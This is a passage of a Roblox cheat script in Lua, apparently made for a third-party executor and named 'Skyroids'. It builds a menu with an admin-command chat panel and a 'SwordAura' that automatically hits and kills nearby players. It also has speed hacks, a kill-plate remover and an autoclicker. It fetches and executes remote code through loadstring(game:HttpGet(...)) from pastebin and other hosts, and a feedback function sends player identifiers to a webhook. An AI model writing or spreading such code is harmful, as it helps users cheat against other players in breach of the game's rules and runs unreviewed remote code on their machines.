TextButton_29.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
TextButton_29.BackgroundTransparency = 1.000
TextButton_29.BorderColor3 = Color3.fromRGB(0, 0, 0)
TextButton_29.BorderSizePixel = 0
TextButton_29.Position = UDim2.new(0, 0, 0.406727821, 0)
TextButton_29.Size = UDim2.new(0, 155, 0, 32)
TextButton_29.Font = Enum.Font.Ubuntu
TextButton_29.Text = ";creeper"
TextButton_29.TextColor3 = Color3.fromRGB(255, 255, 255)
TextButton_29.TextScaled = true
TextButton_29.TextSize = 14.000
TextButton_29.TextWrapped = true
TextButton_29.TextXAlignment = Enum.TextXAlignment.Left

UIPadding_29.Parent = TextButton_29
UIPadding_29.PaddingLeft = UDim.new(0, 6)

TextButton_30.Parent = ScrollingFrame
TextButton_30.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
TextButton_30.BackgroundTransparency = 1.000
TextButton_30.BorderColor3 = Color3.fromRGB(0, 0, 0)
TextButton_30.BorderSizePixel = 0
TextButton_30.Position = UDim2.new(0, 0, 0.406727821, 0)
TextButton_30.Size = UDim2.new(0, 155, 0, 32)
TextButton_30.Font = Enum.Font.Ubuntu
TextButton_30.Text = ";nolegs"
TextButton_30.TextColor3 = Color3.fromRGB(255, 255, 255)
TextButton_30.TextScaled = true
TextButton_30.TextSize = 14.000
TextButton_30.TextWrapped = true
TextButton_30.TextXAlignment = Enum.TextXAlignment.Left

UIPadding_30.Parent = TextButton_30
UIPadding_30.PaddingLeft = UDim.new(0, 6)

TextButton_31.Parent = ScrollingFrame
TextButton_31.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
TextButton_31.BackgroundTransparency = 1.000
TextButton_31.BorderColor3 = Color3.fromRGB(0, 0, 0)
TextButton_31.BorderSizePixel = 0
TextButton_31.Position = UDim2.new(0, 0, 0.406727821, 0)
TextButton_31.Size = UDim2.new(0, 155, 0, 32)
TextButton_31.Font = Enum.Font.Ubuntu
TextButton_31.Text = ";nolimbs"
TextButton_31.TextColor3 = Color3.fromRGB(255, 255, 255)
TextButton_31.TextScaled = true
TextButton_31.TextSize = 14.000
TextButton_31.TextWrapped = true
TextButton_31.TextXAlignment = Enum.TextXAlignment.Left

UIPadding_31.Parent = TextButton_31
UIPadding_31.PaddingLeft = UDim.new(0, 6)

TextButton_32.Parent = ScrollingFrame
TextButton_32.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
TextButton_32.BackgroundTransparency = 1.000
TextButton_32.BorderColor3 = Color3.fromRGB(0, 0, 0)
TextButton_32.BorderSizePixel = 0
TextButton_32.Position = UDim2.new(0, 0, 0.406727821, 0)
TextButton_32.Size = UDim2.new(0, 155, 0, 32)
TextButton_32.Font = Enum.Font.Ubuntu
TextButton_32.Text = ";view"
TextButton_32.TextColor3 = Color3.fromRGB(255, 255, 255)
TextButton_32.TextScaled = true
TextButton_32.TextSize = 14.000
TextButton_32.TextWrapped = true
TextButton_32.TextXAlignment = Enum.TextXAlignment.Left

UIPadding_32.Parent = TextButton_32
UIPadding_32.PaddingLeft = UDim.new(0, 6)

TextButton_33.Parent = ScrollingFrame
TextButton_33.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
TextButton_33.BackgroundTransparency = 1.000
TextButton_33.BorderColor3 = Color3.fromRGB(0, 0, 0)
TextButton_33.BorderSizePixel = 0
TextButton_33.Position = UDim2.new(0, 0, 0.406727821, 0)
TextButton_33.Size = UDim2.new(0, 155, 0, 32)
TextButton_33.Font = Enum.Font.Ubuntu
TextButton_33.Text = ";unview (and setfps)"
TextButton_33.TextColor3 = Color3.fromRGB(255, 255, 255)
TextButton_33.TextScaled = true
TextButton_33.TextSize = 14.000
TextButton_33.TextWrapped = true
TextButton_33.TextXAlignment = Enum.TextXAlignment.Left

UIPadding_33.Parent = TextButton_33
UIPadding_33.PaddingLeft = UDim.new(0, 6)

TextButton_34.Parent = ScrollingFrame
TextButton_34.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
TextButton_34.BackgroundTransparency = 1.000
TextButton_34.BorderColor3 = Color3.fromRGB(0, 0, 0)
TextButton_34.BorderSizePixel = 0
TextButton_34.Position = UDim2.new(0, 0, 0.406727821, 0)
TextButton_34.Size = UDim2.new(0, 155, 0, 32)
TextButton_34.Font = Enum.Font.Ubuntu
TextButton_34.Text = ";disable private members"
TextButton_34.TextColor3 = Color3.fromRGB(255, 255, 255)
TextButton_34.TextScaled = true
TextButton_34.TextSize = 14.000
TextButton_34.TextWrapped = true
TextButton_34.TextXAlignment = Enum.TextXAlignment.Left

UIPadding_34.Parent = TextButton_34
UIPadding_34.PaddingLeft = UDim.new(0, 6)

TextButton_35.Parent = ScrollingFrame
TextButton_35.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
TextButton_35.BackgroundTransparency = 1.000
TextButton_35.BorderColor3 = Color3.fromRGB(0, 0, 0)
TextButton_35.BorderSizePixel = 0
TextButton_35.Position = UDim2.new(0, 0, 0.406727821, 0)
TextButton_35.Size = UDim2.new(0, 155, 0, 32)
TextButton_35.Font = Enum.Font.Ubuntu
TextButton_35.Text = ";enable private members"
TextButton_35.TextColor3 = Color3.fromRGB(255, 255, 255)
TextButton_35.TextScaled = true
TextButton_35.TextSize = 14.000
TextButton_35.TextWrapped = true
TextButton_35.TextXAlignment = Enum.TextXAlignment.Left

UIPadding_35.Parent = TextButton_35
UIPadding_35.PaddingLeft = UDim.new(0, 6)

-- Scripts:

local function OMNSKS_script() -- PrivateOwnerPanel.UIDrag 
	local script = Instance.new('LocalScript', PrivateOwnerPanel)

	-- Made by Real_IceyDev (@lceyDex) --
	-- Simple UI dragger (PC Only/Any device that has a mouse) --
	
	local UIS = game:GetService('UserInputService')
	local frame = script.Parent
	local dragToggle = nil
	local dragSpeed = 0.25
	local dragStart = nil
	local startPos = nil
	
	local function updateInput(input)
		local delta = input.Position - dragStart
		local position = UDim2.new(startPos.X.Scale, startPos.X.Offset + delta.X,
			startPos.Y.Scale, startPos.Y.Offset + delta.Y)
		game:GetService('TweenService'):Create(frame, TweenInfo.new(dragSpeed), {Position = position}):Play()
	end
	
	frame.InputBegan:Connect(function(input)
		if (input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch) then 
			dragToggle = true
			dragStart = input.Position
			startPos = frame.Position
			input.Changed:Connect(function()
				if input.UserInputState == Enum.UserInputState.End then
					dragToggle = false
				end
			end)
		end
	end)
	
	UIS.InputChanged:Connect(function(input)
		if input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch then
			if dragToggle then
				updateInput(input)
			end
		end
	end)
end
coroutine.wrap(OMNSKS_script)()
local function TZFIT_script() -- TextButton.LocalScript 
	local script = Instance.new('LocalScript', TextButton)

	script.Parent.Activated:Connect(function()
		game.TextChatService.TextChannels.RBXGeneral:SendAsync(tostring(script.Parent.Text))
	end)
end
coroutine.wrap(TZFIT_script)()
local function YQEEY_script() -- TextButton_2.LocalScript 
	local script = Instance.new('LocalScript', TextButton_2)

	script.Parent.Activated:Connect(function()
		game.TextChatService.TextChannels.RBXGeneral:SendAsync(tostring(script.Parent.Text))
	end)
end
coroutine.wrap(YQEEY_script)()
local function KJLUDD_script() -- TextButton_3.LocalScript 
	local script = Instance.new('LocalScript', TextButton_3)

	script.Parent.Activated:Connect(function()
		game.TextChatService.TextChannels.RBXGeneral:SendAsync(tostring(script.Parent.Text))
	end)
end
coroutine.wrap(KJLUDD_script)()
local function EUYNP_script() -- TextButton_4.LocalScript 
	local script = Instance.new('LocalScript', TextButton_4)

	script.Parent.Activated:Connect(function()
		game.TextChatService.TextChannels.RBXGeneral:SendAsync(tostring(script.Parent.Text))
	end)
end
coroutine.wrap(EUYNP_script)()
local function EHCV_script() -- TextButton_5.LocalScript 
	local script = Instance.new('LocalScript', TextButton_5)

	script.Parent.Activated:Connect(function()
		game.TextChatService.TextChannels.RBXGeneral:SendAsync(tostring(script.Parent.Text))
	end)
end
coroutine.wrap(EHCV_script)()
local function PFEMAFG_script() -- TextButton_6.LocalScript 
	local script = Instance.new('LocalScript', TextButton_6)

	script.Parent.Activated:Connect(function()
		game.TextChatService.TextChannels.RBXGeneral:SendAsync(tostring(script.Parent.Text))
	end)
end
coroutine.wrap(PFEMAFG_script)()
local function RGQLHG_script() -- TextButton_7.LocalScript 
	local script = Instance.new('LocalScript', TextButton_7)

	script.Parent.Activated:Connect(function()
		game.TextChatService.TextChannels.RBXGeneral:SendAsync(tostring(script.Parent.Text))
	end)
end
coroutine.wrap(RGQLHG_script)()
local function TWIC_script() -- TextButton_8.LocalScript 
	local script = Instance.new('LocalScript', TextButton_8)

	script.Parent.Activated:Connect(function()
		game.TextChatService.TextChannels.RBXGeneral:SendAsync(tostring(script.Parent.Text))
	end)
end
coroutine.wrap(TWIC_script)()
local function OJAZ_script() -- TextButton_9.LocalScript 
	local script = Instance.new('LocalScript', TextButton_9)

	script.Parent.Activated:Connect(function()
		game.TextChatService.TextChannels.RBXGeneral:SendAsync(tostring(script.Parent.Text))
	end)
end
coroutine.wrap(OJAZ_script)()
local function KUMN_script() -- TextButton_10.LocalScript 
	local script = Instance.new('LocalScript', TextButton_10)

	script.Parent.Activated:Connect(function()
		game.TextChatService.TextChannels.RBXGeneral:SendAsync(tostring(script.Parent.Text))
	end)
end
coroutine.wrap(KUMN_script)()
local function VIQRMPH_script() -- TextButton_11.LocalScript 
	local script = Instance.new('LocalScript', TextButton_11)

	script.Parent.Activated:Connect(function()
		game.TextChatService.TextChannels.RBXGeneral:SendAsync(tostring(script.Parent.Text))
	end)
end
coroutine.wrap(VIQRMPH_script)()
local function DGSPHW_script() -- TextButton_12.LocalScript 
	local script = Instance.new('LocalScript', TextButton_12)

	script.Parent.Activated:Connect(function()
		game.TextChatService.TextChannels.RBXGeneral:SendAsync(tostring(script.Parent.Text))
	end)
end
coroutine.wrap(DGSPHW_script)()
local function ICEH_script() -- TextButton_13.LocalScript 
	local script = Instance.new('LocalScript', TextButton_13)

	script.Parent.Activated:Connect(function()
		game.TextChatService.TextChannels.RBXGeneral:SendAsync(tostring(script.Parent.Text))
	end)
end
coroutine.wrap(ICEH_script)()
local function VHMQOF_script() -- TextButton_14.LocalScript 
	local script = Instance.new('LocalScript', TextButton_14)

	script.Parent.Activated:Connect(function()
		game.TextChatService.TextChannels.RBXGeneral:SendAsync(tostring(script.Parent.Text))
	end)
end
coroutine.wrap(VHMQOF_script)()
local function ZOQO_script() -- TextButton_15.LocalScript 
	local script = Instance.new('LocalScript', TextButton_15)

	script.Parent.Activated:Connect(function()
		game.TextChatService.TextChannels.RBXGeneral:SendAsync(tostring(script.Parent.Text))
	end)
end
coroutine.wrap(ZOQO_script)()
local function LQQDE_script() -- TextButton_16.LocalScript 
	local script = Instance.new('LocalScript', TextButton_16)

	script.Parent.Activated:Connect(function()
		game.TextChatService.TextChannels.RBXGeneral:SendAsync(tostring(script.Parent.Text))
	end)
end
coroutine.wrap(LQQDE_script)()
local function IUIW_script() -- TextButton_17.LocalScript 
	local script = Instance.new('LocalScript', TextButton_17)

	script.Parent.Activated:Connect(function()
		game.TextChatService.TextChannels.RBXGeneral:SendAsync(tostring(script.Parent.Text))
	end)
end
coroutine.wrap(IUIW_script)()
local function GWNQVN_script() -- TextButton_18.LocalScript 
	local script = Instance.new('LocalScript', TextButton_18)

	script.Parent.Activated:Connect(function()
		game.TextChatService.TextChannels.RBXGeneral:SendAsync(tostring(script.Parent.Text))
	end)
end
coroutine.wrap(GWNQVN_script)()
local function LAUQ_script() -- TextButton_19.LocalScript 
	local script = Instance.new('LocalScript', TextButton_19)

	script.Parent.Activated:Connect(function()
		game.TextChatService.TextChannels.RBXGeneral:SendAsync(tostring(script.Parent.Text))
	end)
end
coroutine.wrap(LAUQ_script)()
local function HICPHY_script() -- TextButton_20.LocalScript 
	local script = Instance.new('LocalScript', TextButton_20)

	script.Parent.Activated:Connect(function()
		game.TextChatService.TextChannels.RBXGeneral:SendAsync(tostring(script.Parent.Text))
	end)
end
coroutine.wrap(HICPHY_script)()
local function SEULHW_script() -- TextButton_21.LocalScript 
	local script = Instance.new('LocalScript', TextButton_21)

	script.Parent.Activated:Connect(function()
		game.TextChatService.TextChannels.RBXGeneral:SendAsync(tostring(script.Parent.Text))
	end)
end
coroutine.wrap(SEULHW_script)()
local function DENFLTR_script() -- TextButton_22.LocalScript 
	local script = Instance.new('LocalScript', TextButton_22)

	script.Parent.Activated:Connect(function()
		game.TextChatService.TextChannels.RBXGeneral:SendAsync(tostring(script.Parent.Text))
	end)
end
coroutine.wrap(DENFLTR_script)()
local function MAQRJLK_script() -- TextButton_23.LocalScript 
	local script = Instance.new('LocalScript', TextButton_23)

	script.Parent.Activated:Connect(function()
		game.TextChatService.TextChannels.RBXGeneral:SendAsync(tostring(script.Parent.Text))
	end)
end
coroutine.wrap(MAQRJLK_script)()
local function SJLC_script() -- TextButton_24.LocalScript 
	local script = Instance.new('LocalScript', TextButton_24)

	script.Parent.Activated:Connect(function()
		game.TextChatService.TextChannels.RBXGeneral:SendAsync(tostring(script.Parent.Text))
	end)
end
coroutine.wrap(SJLC_script)()
local function WIZVWB_script() -- TextButton_25.LocalScript 
	local script = Instance.new('LocalScript', TextButton_25)

	script.Parent.Activated:Connect(function()
		game.TextChatService.TextChannels.RBXGeneral:SendAsync(tostring(script.Parent.Text))
	end)
end
coroutine.wrap(WIZVWB_script)()
local function QIHBTV_script() -- TextButton_26.LocalScript 
	local script = Instance.new('LocalScript', TextButton_26)

	script.Parent.Activated:Connect(function()
		game.TextChatService.TextChannels.RBXGeneral:SendAsync(tostring(script.Parent.Text))
	end)
end
coroutine.wrap(QIHBTV_script)()
local function LUDBFXC_script() -- TextButton_27.LocalScript 
	local script = Instance.new('LocalScript', TextButton_27)

	script.Parent.Activated:Connect(function()
		game.TextChatService.TextChannels.RBXGeneral:SendAsync(tostring(script.Parent.Text))
	end)
end
coroutine.wrap(LUDBFXC_script)()
local function CWKDTM_script() -- TextButton_28.LocalScript 
	local script = Instance.new('LocalScript', TextButton_28)

	script.Parent.Activated:Connect(function()
		game.TextChatService.TextChannels.RBXGeneral:SendAsync(tostring(script.Parent.Text))
	end)
end
coroutine.wrap(CWKDTM_script)()
local function TNLE_script() -- TextButton_29.LocalScript 
	local script = Instance.new('LocalScript', TextButton_29)

	script.Parent.Activated:Connect(function()
		game.TextChatService.TextChannels.RBXGeneral:SendAsync(tostring(script.Parent.Text))
	end)
end
coroutine.wrap(TNLE_script)()
local function PWQH_script() -- TextButton_30.LocalScript 
	local script = Instance.new('LocalScript', TextButton_30)

	script.Parent.Activated:Connect(function()
		game.TextChatService.TextChannels.RBXGeneral:SendAsync(tostring(script.Parent.Text))
	end)
end
coroutine.wrap(PWQH_script)()
local function ERERUE_script() -- TextButton_31.LocalScript 
	local script = Instance.new('LocalScript', TextButton_31)

	script.Parent.Activated:Connect(function()
		game.TextChatService.TextChannels.RBXGeneral:SendAsync(tostring(script.Parent.Text))
	end)
end
coroutine.wrap(ERERUE_script)()
local function XJWSQU_script() -- TextButton_32.LocalScript 
	local script = Instance.new('LocalScript', TextButton_32)

	script.Parent.Activated:Connect(function()
		game.TextChatService.TextChannels.RBXGeneral:SendAsync(tostring(script.Parent.Text))
	end)
end
coroutine.wrap(XJWSQU_script)()
local function YGOLLM_script() -- TextButton_33.LocalScript 
	local script = Instance.new('LocalScript', TextButton_33)

	script.Parent.Activated:Connect(function()
		game.TextChatService.TextChannels.RBXGeneral:SendAsync(tostring(script.Parent.Text))
	end)
end
coroutine.wrap(YGOLLM_script)()
local function CEGA_script() -- TextButton_34.LocalScript 
	local script = Instance.new('LocalScript', TextButton_34)

	script.Parent.Activated:Connect(function()
		game.TextChatService.TextChannels.RBXGeneral:SendAsync(tostring(script.Parent.Text))
	end)
end
coroutine.wrap(CEGA_script)()
local function PJARDHG_script() -- TextButton_35.LocalScript 
	local script = Instance.new('LocalScript', TextButton_35)

	script.Parent.Activated:Connect(function()
		game.TextChatService.TextChannels.RBXGeneral:SendAsync(tostring(script.Parent.Text))
	end)
end
coroutine.wrap(PJARDHG_script)()

    else
    print("initiated")
    end
end


wait(1)

local versionurl = "https://github.com/vipralock/Skyroids/raw/refs/heads/main/skyroidsversion.txt"
local version = game:HttpGet(tostring(versionurl), true)

local scriptname = "Skyroids"

local function LoadAdminScript()
loadstring(game:HttpGet("https://pastebin.com/raw/aY3iQ0wg",true))()
end

local Rayfield = loadstring(game:HttpGet('https://sirius.menu/rayfield'))()

local Window = Rayfield:CreateWindow({
Name = scriptname,
Icon = "star", -- Icon in Topbar. Can use Lucide Icons (string) or Roblox Image (number). 0 to use no icon (default).
LoadingTitle = "Initiating " .. scriptname .. " " .. version,
LoadingSubtitle = "by vipralock",
ShowText = "Rayfield", -- for mobile users to unhide rayfield, change if you'd like
Theme = "Amethyst", -- Check https://docs.sirius.menu/rayfield/configuration/themes

ToggleUIKeybind = "T", -- The keybind to toggle the UI visibility (string like "K" or Enum.KeyCode)

DisableRayfieldPrompts = true,
DisableBuildWarnings = true, -- Prevents Rayfield from warning when the script has a version mismatch with the interface

ConfigurationSaving = {
Enabled = true,
FolderName = "Skyroid", -- Create a custom folder for your hub/game
FileName = "saved_skyroid_config"
},

Discord = {
Enabled = false, -- Prompt the user to join your Discord server if their executor supports it
Invite = "noinvitelink", -- The Discord invite code, do not include discord.gg/. E.g. discord.gg/ ABCD would be ABCD
RememberJoins = true -- Set this to false to make them join the discord every time they load it up
},

KeySystem = false, -- Set this to true to use our key system
KeySettings = {
Title = "Skyroids Confirmation",
Subtitle = "Emter in the key: Skyroids",
Note = "Before doing this, join: ", -- Use this to tell the user how to get a key
FileName = "Key", -- It is recommended to use something unique as other scripts using Rayfield may overwrite your key file
SaveKey = true, -- The user's key will be saved, but if you change the key, they will be unable to use your script
GrabKeyFromSite = false, -- If this is true, set Key below to the RAW site you would like Rayfield to get the key from
Key = {"Hello"} -- List of keys that will be accepted by the system, can be RAW file links (pastebin, github etc) or simple strings ("hello","key22")
}
})

local Main = Window:CreateTab("Main", "star")
local Blatant = Window:CreateTab("Blatant", "flame")
local Visuals = Window:CreateTab("Visuals", "eye-off")
local Tools = Window:CreateTab("Utility", "axe")
local World = Window:CreateTab("World", "earth")
local urllink = "https://discord.gg/e2gfyXwgXw"
local Label = Main:CreateLabel("Welcome! Join the discord: " .. urllink, "sparkles")
local Button = Main:CreateButton({
   Name = "Copy Invitation Link (DISCORD)",
   Callback = function()
   setclipboard(tostring(urllink))
   end,
})

local HttpService = game:GetService("HttpService")
local Players = game:GetService("Players")

local WEBHOOK_URL = ""

function SendFeedback(text)
    local player = Players.LocalPlayer
    if typeof(text) ~= "string" or text == "" then return end

    local payload = {
        content = "**New Feedback Submitted**",
        embeds = {{
            title = "Feedback from " .. player.DisplayName,
            description = "```" .. text .. "```",
            color = 0x00FFFF,
            fields = {
                { name = "Username", value = player.Name, inline = true },
                { name = "DisplayName", value = player.DisplayName, inline = true },
                { name = "Game ID", value = tostring(game.GameId), inline = false },
                { name = "Job ID", value = game.JobId ~= "" and game.JobId or "N/A", inline = false }
            },
            timestamp = DateTime.now():ToIsoDate()
        }}
    }

    request({
        Url = WEBHOOK_URL,
        Method = "POST",
        Headers = {
            ["Content-Type"] = "application/json"
        },
        Body = HttpService:JSONEncode(payload)
    })
end


local Input = Main:CreateInput({
   Name = "(✨ NEW) Send Feedback!",
   CurrentValue = "",
   PlaceholderText = "Give a brief sentence on what we can do or questions.",
   RemoveTextAfterFocusLost = false,
   Flag = "feedback",
   Callback = function(Text)
   if Text == "" then return end
   SendFeedback(tostring(Text))
   end,
})

local weclomemessages = {
    "Howdy!",
    "Whats popping?",
    "Whats good,",
    "Welcome back,",
    "Hows it going,",
    "Whats up!",
    "Yoo!",
    "Wassup my man,"
}
local Label = Main:CreateLabel(tostring(weclomemessages[math.random(1,#weclomemessages)]) .. " " .. game.Players.LocalPlayer.DisplayName, "hand")
local Paragraph = Main:CreateParagraph({Title = "Welcome to Skyroids", Content = "Browse through the tabs to see the modules.\nNEW: Sorry! Vyperon will not be maintaining this script anymore, but Rolis will! If you would like to ask or discuss any issues, than you can freely here by contacting the NEW owner at his discord: rolisis#0000"})
local Paragraph = Main:CreateParagraph({Title = "cool people", Content = "Contributors:\nDevelopers: vyperon"})

function notify(title, description, duration, icon)
        if icon == "warning" then
                Rayfield:Notify({
   Title = title,
   Content = description,
   Duration = duration,
   Image = "shield-alert",
})
elseif icon == "alert" then
        Rayfield:Notify({
   Title = title,
   Content = description,
   Duration = duration,
   Image = "siren",
})
else
        Rayfield:Notify({
   Title = title,
   Content = description,
   Duration = duration,
   Image = "megaphone" or "mega-phone",
})
end
end


local RunService = game:GetService("RunService")

local keybindEnabled = false  -- controls whether the R keybind can toggle autoclicking
local autoclickActive = false -- whether autoclicking is currently toggled ON
local lastClick = 0
local delaytime = 0.05

-- Toggle to enable/disable the R keybind
local KeybindToggle = Tools:CreateToggle({
    Name = "Autoclicking",
    CurrentValue = false,
    Flag = "EnableKeybind",
    Callback = function(value)
        keybindEnabled = value
        if not keybindEnabled then
            autoclickActive = false -- disable autoclick if keybind disabled
        else
            notify("Autoclicking", "Toggle autoclicking with your specific keybind", 5)
        end
    end,
})

-- Keybind to toggle autoclicking ON/OFF (only works if keybindEnabled)
local AutoclickBindment = Tools:CreateKeybind({
    Name = "Autoclicking (Bindment)",
    CurrentKeybind = "R",
    HoldToInteract = false,
    Flag = "ToggleAutoclick",
    Callback = function()
        if keybindEnabled then
            autoclickActive = not autoclickActive
        else
            
        end
    end,
})

-- Slider to control delay between clicks
local Slider = Tools:CreateSlider({
   Name = "Autoclicking (Delay)",
   Range = {0, 1},          -- Changed to 0 to 1 second delay
   Increment = 0.01,
   Suffix = " second(s)",
   CurrentValue = delaytime,
   Flag = "AutoclickDelay",
   Callback = function(value)
       delaytime = value    -- Fixed: use 'value' lowercase, not 'Value'
       print(string.format("Autoclick delay set to %.2f seconds", delaytime))
   end,
})

-- Clicking loop
RunService.RenderStepped:Connect(function()
    if autoclickActive then
        if tick() - lastClick >= delaytime then
            mouse1click()
            lastClick = tick()
        end
    end
end)
local Button = World:CreateButton({
   Name = "NoOutOfBounds",
   Callback = function()
        local suc, res = pcall(function()
                workspace.Lobby.KillPlates:Destroy()
        end)

        if suc then
                notify("NoOutOfBounds", "Removed Kill Parts", 8)
        else
                notify("NoOutOfBounds", "Already removed Kill Parts!", 8, "warning")
        end
   end,
})
local Players = game:GetService("Players")
local RunService = game:GetService("RunService")

local player = Players.LocalPlayer
local range = 10
local enabled = false
local disableEquip = false
local faceTarget = true -- New variable for facing toggle
local currentTool = nil

-- Toggle 1: SwordAura Master Switch
local MainToggle = Blatant:CreateToggle({
	Name = "SwordAura",
	CurrentValue = false,
	Flag = "SwordAura",
	Callback = function(Value)
		enabled = Value
		if not Value then
			if currentTool and currentTool:IsDescendantOf(player.Character) then
				pcall(function()
					currentTool:Deactivate()
					currentTool.Parent = player.Backpack
				end)
			end
		else
			notify("SwordAura", "Searching for nearest players to kill...", 5)
		end
	end,
})

-- Toggle 2: Disable Auto-Equip
local NoEquipToggle = Blatant:CreateToggle({
	Name = "SwordAura (Enable Equipping)",
	CurrentValue = true,
	Flag = "SwordAuraEquipping",
	Callback = function(Value)
		disableEquip = Value
	end,
})

-- Toggle 3: Face Target On/Off
local FaceToggle = Blatant:CreateToggle({
	Name = "SwordAura (Facing)",
	CurrentValue = true,
	Flag = "SwordAuraFacing",
	Callback = function(Value)
		faceTarget = Value
	end,
})

-- Main Loop with All Checks and Horizontal Facing controlled by faceTarget toggle
RunService.RenderStepped:Connect(function()
	if not enabled then return end
	if not player or not player.Character or not player.Character.Parent then return end

	local char = player.Character
	local humanoid = char:FindFirstChildOfClass("Humanoid")
	if not humanoid or humanoid.Health <= 0 then return end

	local foundTarget = false

	for _, otherPlayer in ipairs(Players:GetPlayers()) do
		if otherPlayer ~= player and otherPlayer.Character and otherPlayer.Character.Parent then
			local targetChar = otherPlayer.Character
			local targetHRP = targetChar:FindFirstChild("HumanoidRootPart")
			local targetHumanoid = targetChar:FindFirstChildOfClass("Humanoid")
			local hasForcefield = targetChar:FindFirstChildOfClass("ForceField")

			if targetHRP and targetHumanoid and targetHumanoid.Health > 0 and not hasForcefield then
				local success, distance = pcall(function()
					return player:DistanceFromCharacter(targetHRP.Position)
				end)

				if success and distance and distance <= range then
					foundTarget = true

					-- FACE TARGET HORIZONTALLY IF faceTarget IS TRUE
					if faceTarget then
						local hrp = char:FindFirstChild("HumanoidRootPart")
						if hrp then
							local lookPos = Vector3.new(targetHRP.Position.X, hrp.Position.Y, targetHRP.Position.Z)
							hrp.CFrame = CFrame.new(hrp.Position, lookPos)
						end
					end

					-- Equip sword/tool if needed
					local tool = char:FindFirstChildOfClass("Tool")
					if not tool and not disableEquip then
						local sword = player.Backpack and (player.Backpack:FindFirstChild("Sword") or player.Backpack:FindFirstChildWhichIsA("Tool"))
						if sword and sword:IsA("Tool") then
							pcall(function()
								sword.Parent = char
							end)
							tool = sword
						end
					end

					-- Activate tool and fire touch interests
					if tool and tool:IsA("Tool") and tool:FindFirstChild("Handle") then
						currentTool = tool
						pcall(function()
							tool:Activate()
						end)

						for _, part in ipairs(targetChar:GetChildren()) do
							if part and part:IsA("BasePart") then
								pcall(function()
									firetouchinterest(tool.Handle, part, 0)
									firetouchinterest(tool.Handle, part, 1)
								end)
							end
						end
					end

					break -- attack only one target per frame
				end
			end
		end
	end

	-- Deactivate and unequip if no valid targets
	if not foundTarget and currentTool and currentTool:IsDescendantOf(char) then
		pcall(function()
			currentTool:Deactivate()
			if not disableEquip then
				currentTool.Parent = player.Backpack
			end
		end)
	end
end)
local Players = game:GetService("Players")
local RunService = game:GetService("RunService")
local UserInputService = game:GetService("UserInputService")

local player = Players.LocalPlayer

-- Initialize variables BEFORE creating GUI elements
local enabled = false
local method = "Walkspeed"
local speedValue = 16
local pulseTime = 1
local connection = nil

-- Function to get current character and humanoid
local function getCharacterAndHumanoid()
    local character = player.Character
    if character then
        local humanoid = character:FindFirstChild("Humanoid")
        local rootPart = character:FindFirstChild("HumanoidRootPart")
        return character, humanoid, rootPart
    end
    return nil, nil, nil
end

-- Function to handle movement
local function handleMovement(deltaTime)
    if not enabled then return end
    
    local character, humanoid, rootPart = getCharacterAndHumanoid()
    if not character or not humanoid or not rootPart then return end
    
    if method == "Walkspeed" then
        humanoid.WalkSpeed = speedValue
        
    elseif method == "Vector" then
        -- Only apply vector movement when player is moving
        local moveVector = humanoid.MoveDirection
        if moveVector.Magnitude > 0 then
            rootPart.Velocity = Vector3.new(
                moveVector.X * speedValue,
                rootPart.Velocity.Y, -- Preserve Y velocity for gravity
                moveVector.Z * speedValue
            )
        end
        
    elseif method == "CFrame" then
        -- Only move when player is actually trying to move
        local moveVector = humanoid.MoveDirection
        if moveVector.Magnitude > 0 then
            local moveDirection = Vector3.new(moveVector.X, 0, moveVector.Z).Unit
            rootPart.CFrame = rootPart.CFrame + (moveDirection * speedValue * deltaTime)
        end
        
    elseif method == "Pulse" then
        local moveVector = humanoid.MoveDirection
        if moveVector.Magnitude > 0 then
            pulseTime = pulseTime + deltaTime
            local pulseSpeed = math.abs(math.sin(pulseTime * 5)) * speedValue -- Added frequency multiplier
            local moveDirection = Vector3.new(moveVector.X, 0, moveVector.Z).Unit
            rootPart.CFrame = rootPart.CFrame + (moveDirection * pulseSpeed * deltaTime)
        end
    end
end

-- Function to reset movement
local function resetMovement()
    local character, humanoid, rootPart = getCharacterAndHumanoid()
    if humanoid then
        humanoid.WalkSpeed = 16 -- Reset to default
    end
    if rootPart then
        -- Only reset horizontal velocity, preserve Y for gravity
        rootPart.Velocity = Vector3.new(0, rootPart.Velocity.Y, 0)
    end
end

-- Create GUI elements
local Toggle = Blatant:CreateToggle({
    Name = "Speed",
    CurrentValue = false,
    Flag = "SpeedToggle",
    Callback = function(value)
        enabled = value
        if not enabled then
            resetMovement()
            if connection then
                connection:Disconnect()
                connection = nil
            end
        else
            -- Start the movement loop
            if connection then connection:Disconnect() end
            connection = RunService.Heartbeat:Connect(handleMovement)
        end
    end,
})

local Dropdown = Blatant:CreateDropdown({
    Name = "Speed (Method)",
    Options = {"Walkspeed", "Vector", "CFrame", "Pulse"},
    CurrentOption = {"Walkspeed"},
    MultipleOptions = false,
    Flag = "SpeedMethod",
    Callback = function(options)
        if options and #options > 0 then
            method = options[1]
            -- Reset movement when method changes
            resetMovement()
        end
    end,
})

local Input = Blatant:CreateInput({
    Name = "Speed (Value)",
    CurrentValue = "16",
    PlaceholderText = "How fast you'll go",
    RemoveTextAfterFocusLost = false,
    Flag = "SpeedValue",
    Callback = function(text)
        local num = tonumber(text)
        if num and num > 0 then
            speedValue = num
        end
    end,
})

-- Handle character respawning
player.CharacterAdded:Connect(function(character)
    -- Wait for character to load
    character:WaitForChild("Humanoid")
    character:WaitForChild("HumanoidRootPart")
    
    -- Reset variables
    pulseTime = 0
    
    -- If speed was enabled, restart it
    if enabled then
        if connection then connection:Disconnect() end
        connection = RunService.Heartbeat:Connect(handleMovement)
    end
end)

-- Cleanup when player leaves
player.AncestryChanged:Connect(function()
    if connection then
        connection:Disconnect()
        connection = nil
    end
end)
local Players = game:GetService("Players")
local RunService = game:GetService("RunService")
local LocalPlayer = Players.LocalPlayer
local Camera = workspace.CurrentCamera

local viewingEnabled = false
local targetName = ""
local followConnection = nil

-- Forcefully stop all viewing
local function stopViewing()
	if followConnection then
		followConnection:Disconnect()
		followConnection = nil
	end

	-- Reset camera only if it was changed
	if Camera.CameraSubject ~= LocalPlayer.Character:FindFirstChild("Humanoid") then
